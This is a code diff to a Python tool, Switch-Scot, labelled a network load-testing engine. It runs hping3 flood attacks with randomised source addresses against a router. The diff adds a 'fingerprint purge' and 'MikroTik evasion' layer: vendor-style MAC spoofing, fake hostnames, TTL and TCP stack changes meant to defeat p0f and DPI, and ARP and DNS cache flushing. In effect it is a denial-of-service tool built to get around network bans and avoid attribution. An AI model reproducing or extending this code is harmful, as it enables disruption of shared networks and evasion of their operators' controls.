@@ -4,6 +4,7 @@
 """
 Switch-Scot ⚡
 Universal Multi-Interface Network Resilience & Load Testing Engine
+Equipped with Deep Fingerprint Purge & MikroTik Evasion Stack
 Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
 Developed by: Mohammed Yaqeen (Yemen - Sana'a) | محمد يقين مجمل الفايق
 """
@@ -27,10 +28,26 @@ BANNER = r"""
   \___ \ \ /\ / / | __/ __| '_ \_____\___ \ / __|/ _ \| __|
   ____) \ V  V /| | || (__| | | |    ____) | (__| (_) | |_ 
  |_____/ \_/\_/ |_|\__\___|_| |_|   |_____/ \___|\___/ \__|
-                                                           ⚡ v4.0
- المطور: محمد يقين مجمل الفايق - صنعاء، اليمن
- Author: Mohammed Yaqeen - Sana'a, Yemen
+                                                           ⚡ v4.5 Pro
+ المطور: محمد يقين مجمل الفايق - صنعاء، اليمن 🇾🇪
+ Author: Mohammed Yaqeen - Sana'a, Yemen 🇾🇪
 """
+
+# Hardware Vendor OUI Pool for realistic MAC Spoofing
+VENDOR_MAC_POOLS = {
+    "apple":    ["00:1c:b3", "00:cd:fe", "14:10:9f", "28:cf:e9", "3c:22:fb", "70:3e:ac", "bc:d0:74", "f4:5c:89"],
+    "samsung":  ["00:12:47", "00:26:37", "04:18:0f", "14:bb:6e", "34:be:00", "50:c8:e5", "8c:77:12", "cc:07:ab"],
+    "google":   ["00:1a:11", "3c:5a:37", "54:60:09", "70:3a:cb", "94:eb:cd", "f4:03:04"],
+    "xiaomi":   ["00:ec:0a", "18:59:36", "34:ce:00", "64:09:80", "78:02:f8", "8c:be:be"],
+    "intel":    ["00:1b:21", "00:21:6a", "34:13:e8", "68:05:ca", "80:86:f2", "a4:4c:c8"]
+}
+
+DEVICE_HOST_POOL = [
+    "iPhone-15-Pro-Max", "iPhone-14-Pro", "iPad-Pro-M2", "Galaxy-S24-Ultra", 
+    "Galaxy-Tab-S9", "Pixel-8-Pro", "Xiaomi-14-Ultra", "MacBook-Pro-M3", 
+    "Dell-XPS-15", "ThinkPad-X1-Carbon", "Smart-TV-LG-OLED", "Sony-Bravia-4K", 
+    "PlayStation-5", "Surface-Laptop-5", "Workstation-X"
+]
 
 MESSAGES = {
     "ar": {
@@ -45,21 +62,20 @@ MESSAGES = {
         "enter_port": "أدخل رقم المنفذ المطلوب [الافتراضي {default}]: ",
         "final_port": "المنفذ المعتمد: ",
         "modes_title": "أوضاع الفحص والتقييم المتاحة:",
-        "mode_1": "1 - نمط TCP-SYN (استنزاف طابور اتصالات الراوتر - الأقوى)",
+        "mode_1": "1 - نمط TCP-SYN (استنزاف اتصالات الراوتر - الأقوى)",
         "mode_2": "2 - نمط UDP (ضغط الذاكرة المؤقتة للراوتر)",
         "mode_3": "3 - نمط ICMP (قياس سرعة استجابة وتأخير المعالج)",
         "mode_4": "4 - نمط TCP-ACK (فحص واختبار جدار الحماية)",
         "select_mode": "اختر رقم وضع الفحص [الافتراضي 1]: ",
         "selected_mode": "الوضع المعتمد: ",
-        "hostname_prompt": "اسم الجهاز المنحول ليظهر في الراوتر [اضغط Enter للاسم العشوائي]: ",
+        "stealth_title": "خيارات مسح البصمة وتجاوز حظر شبكات الميكروتك (Anti-Tracking):",
+        "stealth_1": "1 - تمويه ذكي آمن (تعديل TTL + مسح ذاكرة ARP + تغيير اسم الجهاز + الحفاظ على الواي فاي)",
+        "stealth_2": "2 - مسح وتزوير فيزيائي كامل (تغيير MAC + تدوير بصمة النواة TCP/TTL + مسح ARP و DNS)",
+        "stealth_3": "3 - تخصيص يدوي كامل لاسم وهوية الجهاز",
+        "select_stealth": "اختر سياسة مسح البصمة [1-3، الافتراضي 1]: ",
+        "hostname_prompt": "أدخل اسم الجهاز المخصص ليظهر في الراوتر [اضغط Enter للاسم العشوائي]: ",
         "custom_host_set": "اسم الجهاز المعتمد: ",
-        "random_host_set": "اسم الجهاز: توليد ذكي عشوائي",
-        "mac_title": "خيارات الماك أدرس:",
-        "mac_1": "1 - الإبقاء على الماك الحالي (موصى به لثبات الواي فاي)",
-        "mac_2": "2 - تدوير الماك عشوائياً (تمويه فيزيائي شامل)",
-        "select_mac": "اختر سياسة الماك [الافتراضي 1]: ",
-        "mac_safe": "سياسة الماك: الحفاظ على الماك الحالي لثبات الاتصال",
-        "mac_random": "سياسة الماك: تدوير الماك عشوائياً",
+        "random_host_set": "اسم الجهاز: تم التوليد العشوائي الذكي",
         "press_enter": "اضغط ENTER للبدء والانطلاق فوراً...",
         "engine_active": "⚡ محرك SWITCH-SCOT يعمل الآن بأقصى طاقة ⚡",
         "platform": "بيئة التشغيل: ",
@@ -75,7 +91,7 @@ MESSAGES = {
         "termux_install_hint": "[*] للتثبيت على تيرمكس: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
         "debian_install_hint": "[*] للتثبيت على دبيان أو كالي: sudo apt install -y hping3 macchanger iproute2",
         "arch_install_hint": "[*] للتثبيت على آرش لينكس: sudo pacman -S --noconfirm hping macchanger iproute2",
-        "applying_stealth": "\n[*] جاري تطبيق التمويه وتجهيز الهوية...",
+        "applying_stealth": "\n[*] جاري مسح البصمات وتطبيق التمويه الشامل لمكافحة الحظر...",
         "verifying_carrier": "[*] جاري التحقق من جاهزية كرت الشبكة ومسار التوجيه على {iface}...",
         "carrier_ready": "[+] كرت الشبكة {iface} متصل ومسار التوجيه إلى {target} جاهز.",
         "carrier_timeout": "[!] تنبيه: تم بدء الإرسال المباشر على {iface}."
@@ -98,15 +114,14 @@ MESSAGES = {
         "mode_4": "4 - TCP-ACK (Stateful Firewall Inspection)",
         "select_mode": "Select Mode [Default 1]: ",
         "selected_mode": "Selected Mode: ",
+        "stealth_title": "Fingerprint Purge & Anti-Tracking Policy (MikroTik Evasion):",
+        "stealth_1": "1 - Smart Safe Stealth (Spoof TTL + Flush ARP + Random Hostname + Keep Wi-Fi Stable)",
+        "stealth_2": "2 - Full Hardware & OS Purge (Rotate MAC + Morph TCP/TTL Stack + Flush ARP/DNS)",
+        "stealth_3": "3 - Custom Manual Identity Configuration",
+        "select_stealth": "Select Stealth Policy [1-3, Default 1]: ",
         "hostname_prompt": "Custom Device Hostname [Press Enter for Random]: ",
         "custom_host_set": "Custom Hostname: ",
-        "random_host_set": "Hostname: Random Smart Device",
-        "mac_title": "MAC Address Policy:",
-        "mac_1": "1 - Keep Current MAC (Recommended for stable Wi-Fi)",
-        "mac_2": "2 - Randomize MAC Address (Full Spoof)",
-        "select_mac": "Select Policy [Default 1]: ",
-        "mac_safe": "MAC Policy: Keep Current MAC",
-        "mac_random": "MAC Policy: Randomize MAC",
+        "random_host_set": "Hostname: Random Smart Device Generated",
         "press_enter": "Press [ENTER] to Launch Switch-Scot...",
         "engine_active": "⚡ SWITCH-SCOT MULTI-INTERFACE ENGINE ACTIVE ⚡",
         "platform": "Platform   : ",
@@ -122,7 +137,7 @@ MESSAGES = {
         "termux_install_hint": "[*] Install on Termux: pkg install root-repo && pkg install tsu hping3 macchanger iproute2",
         "debian_install_hint": "[*] Install on Debian/Kali: sudo apt install -y hping3 macchanger iproute2",
         "arch_install_hint": "[*] Install on Arch: sudo pacman -S --noconfirm hping macchanger iproute2",
-        "applying_stealth": "\n[*] Applying persistent obfuscation layer...",
+        "applying_stealth": "\n[*] Purging fingerprints and applying full anti-tracking stealth layer...",
         "verifying_carrier": "[*] Verifying carrier link and route readiness on {iface}...",
         "carrier_ready": "[+] Interface {iface} connected. Route to {target} verified.",
         "carrier_timeout": "[!] Notice: Link timeout reached. Proceeding on {iface}."
@@ -303,41 +318,54 @@ class SwitchScot:
         print(self.msg["carrier_timeout"].format(iface=iface))
         return False
 
+    def generate_vendor_mac(self):
+        """Generates a realistic vendor-based MAC address (Apple, Samsung, Intel, Google, Xiaomi)."""
+        vendor = random.choice(list(VENDOR_MAC_POOLS.keys()))
+        oui = random.choice(VENDOR_MAC_POOLS[vendor])
+        nic = ":".join(f"{random.randint(0, 255):02x}" for _ in range(3))
+        return f"{oui}:{nic}"
+
     def randomize_identity(self):
         print(self.msg["applying_stealth"])
         
-        # 1. Randomize TTL (64 - 128)
-        new_ttl = random.randint(64, 128)
+        # 1. Morph Kernel Fingerprint (TTL & TCP Stack Evasion against p0f and DPI)
+        # Randomize Default TTL (Windows: 128, Linux/Android/iOS: 64, Cisco: 255)
+        new_ttl = random.choice([64, 128, 64, 128, 128])
         subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)
+        
+        # Randomize TCP SYN Window scaling and Timestamps to morph TCP SYN Fingerprints
+        tcp_timestamps = random.choice([0, 1])
+        tcp_sack = random.choice([0, 1])
+        subprocess.run(["sysctl", "-w", f"net.ipv4.tcp_timestamps={tcp_timestamps}"], capture_output=True)
+        subprocess.run(["sysctl", "-w", f"net.ipv4.tcp_sack={tcp_sack}"], capture_output=True)
 
-        # 2. Set Device Hostname
+        # 2. Spoof Device Hostname (DHCP Option 12)
         if self.custom_hostname:
             new_host = self.custom_hostname.replace(" ", "-")
         else:
-            host_pool = [
-                "iPhone-14-Pro", "iPad-Air", "Galaxy-S23", "Pixel-8-Pro", 
-                "MacBook-Pro-M2", "Dell-XPS-15", "ThinkPad-X1", "Smart-TV-LG",
-                "Workstation-X", "Ubuntu-Server", "Surface-Laptop"
-            ]
-            new_host = f"{random.choice(host_pool)}-{random.randint(100, 999)}"
+            new_host = f"{random.choice(DEVICE_HOST_POOL)}-{random.randint(100, 999)}"
             
         subprocess.run(["hostname", new_host], capture_output=True)
         self.current_hostname = new_host
 
-        # 3. Randomize MAC Address for all selected interfaces
+        # 3. Randomize Physical Hardware MAC Address
         for iface in self.interfaces:
             if not self.skip_mac:
-                print(f"[*] Cycling MAC address on {iface}...")
+                new_mac = self.generate_vendor_mac()
+                print(f"[*] Rotating MAC on {iface} to vendor spoof [{new_mac}]...")
                 subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
-                subprocess.run(["macchanger", "-r", iface], capture_output=True)
+                subprocess.run(["ip", "link", "set", iface, "address", new_mac], capture_output=True)
                 subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)
                 self.current_macs[iface] = self.get_mac_address(iface)
                 self.wait_for_carrier_and_route(iface)
             else:
                 self.current_macs[iface] = self.get_mac_address(iface)
 
-        # 4. Flush ARP neighbor cache
+        # 4. Flush ARP Neighbor Table & Gateway Cache (MikroTik MAC/IP Cache Evasion)
         subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
+        
+        # 5. Flush Local DNS Caches if available
+        subprocess.run(["resolvectl", "flush-caches"], capture_output=True)
 
     def build_command_for_interface(self, iface):
         base_cmd = ["hping3", "--flood", "--rand-source", "-I", iface]
@@ -410,8 +438,8 @@ def run_interactive_menu():
     print(BANNER)
     
     print("=" * 65)
-    print(" 1 - اللغة العربية")
-    print(" 2 - English")
+    print(" 1 - اللغة العربية 🇾🇪")
+    print(" 2 - English 🏴‍☠️")
     print("=" * 65)
     lang_sel = input("اختر اللغة / Select Language [1-2, default 1]: ").strip()
     lang = "en" if lang_sel == "2" else "ar"
@@ -488,21 +516,30 @@ def run_interactive_menu():
         chosen_mode = "tcp-syn"
     print(f"{msg['selected_mode']}{chosen_mode.upper()}")
 
-    # 5. Hostname Policy
-    host_input = input(f"\n{msg['hostname_prompt']}").strip()
-    custom_host = host_input if host_input else None
-    if custom_host:
-        print(f"{msg['custom_host_set']}{custom_host}")
-    else:
+    # 5. Fingerprint & Anti-Tracking Policy
+    print(f"\n{msg['stealth_title']}")
+    print(f"  {msg['stealth_1']}")
+    print(f"  {msg['stealth_2']}")
+    print(f"  {msg['stealth_3']}")
+    stealth_choice = input(f"\n{msg['select_stealth']}").strip()
+    
+    skip_mac = True
+    custom_host = None
+    
+    if stealth_choice == "2":
+        skip_mac = False
         print(f"{msg['random_host_set']}")
-
-    # 6. MAC Address Policy
-    print(f"\n{msg['mac_title']}")
-    print(f"  {msg['mac_1']}")
-    print(f"  {msg['mac_2']}")
-    mac_choice = input(f"\n{msg['select_mac']}").strip()
-    skip_mac = False if mac_choice == "2" else True
-    print(f"{msg['mac_safe'] if skip_mac else msg['mac_random']}")
+    elif stealth_choice == "3":
+        host_input = input(f"\n{msg['hostname_prompt']}").strip()
+        custom_host = host_input if host_input else None
+        mac_ask = input("تدوير الماك أدرس أيضاً؟ / Randomize MAC? [y/N]: ").strip().lower()
+        skip_mac = False if mac_ask in ["y", "yes", "ن", "نعم"] else True
+        if custom_host:
+            print(f"{msg['custom_host_set']}{custom_host}")
+    else:
+        # Default Smart Stealth (Safe Wi-Fi)
+        skip_mac = True
+        print(f"{msg['random_host_set']}")
 
     # Launch Engine
     print("\n" + "=" * 65)
@@ -566,6 +603,11 @@ def main():
         help="Skip MAC address randomization (Recommended for active Wi-Fi on laptops)"
     )
     parser.add_argument(
+        "--purge",
+        action="store_true",
+        help="Execute an immediate standalone identity & fingerprint purge (MAC, TTL, Hostname, ARP, DNS)"
+    )
+    parser.add_argument(
         "-l", "--lang",
         choices=["ar", "en"],
         default="ar",
@@ -587,6 +629,13 @@ def main():
         custom_hostname=args.hostname,
         lang=args.lang
     )
+
+    if args.purge:
+        engine.check_root()
+        engine.randomize_identity()
+        print("\n[+] Deep identity & fingerprint purge completed successfully.")
+        sys.exit(0)
+
     engine.start()
 
 if __name__ == "__main__":
